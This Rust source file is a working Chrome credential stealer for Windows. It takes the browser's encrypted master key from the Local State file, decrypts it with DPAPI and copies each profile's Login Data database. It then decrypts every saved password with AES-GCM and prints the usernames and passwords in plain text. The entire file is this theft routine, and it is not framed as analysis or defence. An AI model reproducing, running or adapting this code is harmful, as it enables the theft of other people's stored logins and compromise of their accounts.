use std::{fs, slice};
use std::env;
use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::Read;
use std::ptr::{null_mut};
use std::str::from_utf8;
use base64::Engine;
use base64::engine::general_purpose;
use serde_json::{Value};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::winbase::LocalFree;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use regex::Regex;
use rusqlite::{Connection, Error as RusqliteErr};
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use aes_gcm::aead::Aead;
use aes_gcm::aead::generic_array::GenericArray;

static PATH_LOCAL: &str = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
static PATH_DATA: &str = "\\AppData\\Local\\Google\\Chrome\\User Data";

#[derive(Debug)]
struct LoginData {
    action_url: String,
    username_value: String,
    password_value: Vec<u8>,
}

fn get_profile() -> Option<OsString>{
    env::var_os("USERPROFILE")
}

fn get_key_unprotected(data: &mut [u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut data_in = CRYPTOAPI_BLOB { cbData: data.len() as u32, pbData: data.as_mut_ptr() };
    let mut data_out = CRYPTOAPI_BLOB { cbData: 0, pbData: null_mut() };
    unsafe {
        CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out);
        let bytes = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
        LocalFree(data_out.pbData as *mut _);
        Ok(bytes)
    }
}

unsafe fn get_secret_key() -> Option<Vec<u8>> {
    let user_profile = get_profile()?;
    let mut chrome_path_local_state = OsString::with_capacity(PATH_DATA.len() + user_profile.len());
    chrome_path_local_state.push(user_profile);
    chrome_path_local_state.push(OsString::from(PATH_LOCAL));

    let mut f = File::open(chrome_path_local_state).ok()?;
    let mut local_state: Vec<u8> = Vec::new();
    f.read_to_end(&mut local_state).ok()?;
    let json_str = from_utf8(&local_state).ok()?;
    let json = serde_json::from_str::<Value>(json_str).ok()?;
    let secret_key_base64_value: &Value;
    match json.get("os_crypt") {
        Some(os_crypt) => {
            secret_key_base64_value = os_crypt.get("encrypted_key")?;
        },
        None => return None
    }
    let secret_key_base64 = secret_key_base64_value.as_str()?;
    let mut secret_key = general_purpose::STANDARD
        .decode(secret_key_base64).ok()?;
    let decrypted_key = get_key_unprotected(&mut secret_key[5..]).ok()?;
    Some(decrypted_key)
}

fn get_db_connection(login_path: &OsString) -> Result<Connection, RusqliteErr>{
    println!("{:?}", login_path);
    fs::copy(login_path, "LoginVault.db").expect("[ERROR]: Permission Denied(OS)!");
    Connection::open("LoginVault.db")
}

fn decrypt_password(ciphertext: Vec<u8>, secret_key: Vec<u8>) -> Option<Vec<u8>>{
    let encrypted_password = &ciphertext[15..];
    let key = GenericArray::from_slice(&secret_key);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Nonce::from_slice(&ciphertext[3..15]);
    let plaintext = cipher.decrypt(&nonce, encrypted_password);
    plaintext.ok()
}

fn main() -> Result<(), Box<dyn std::error::Error>>{
    std::env::set_var("RUST_BACKTRACE", "1");

    let secret_key = unsafe { get_secret_key() }.expect("[ERROR]: Chrome secret key cannot be found!");
    let profile = get_profile().expect("[ERROR]: cannot access USERPROFILE in path!");
    let mut chrome_path = OsString::with_capacity(profile.len() + PATH_DATA.len());
    chrome_path.push(profile);
    chrome_path.push(PATH_DATA);

    let regex = Regex::new(r"^Profile|^Default$").expect("Invalid regex pattern");

    if let Ok(files) = fs::read_dir(&chrome_path) {
        for file in files {
            let file = file.unwrap();
            let file_name = file.file_name();
            let mut sub_path = OsString::with_capacity(chrome_path.len() + file_name.len() + 1);
            sub_path.push(&chrome_path);
            sub_path.push(OsStr::new("\\"));
            sub_path.push(&file_name);
            if !regex.is_match(&file_name.to_string_lossy()) {
                continue;
            }
            sub_path.push(OsStr::new("\\"));
            sub_path.push("Login Data");
            let conn = get_db_connection(&sub_path)?;
            let mut stmt = conn.prepare("SELECT action_url, username_value, password_value FROM logins").expect("[ERROR]: cannot access chrome");

            let hashes = stmt.query_map([], |row| {
                Ok(LoginData {
                        action_url: row.get(0)?,
                        username_value: row.get(1)?,
                        password_value: row.get(2)?
                })
            })?;

            for hash in hashes {
                let hash = hash.unwrap();
                if hash.password_value.len() > 0 {
                    let pass = decrypt_password(hash.password_value, secret_key.clone());
                    match pass {
                        Some(x) =>
                            println!("username:{} password:{:?}", hash.username_value , from_utf8(&x).unwrap()),
                        None => {}
                    }
                }
            }
        }
    }
    Ok(())
}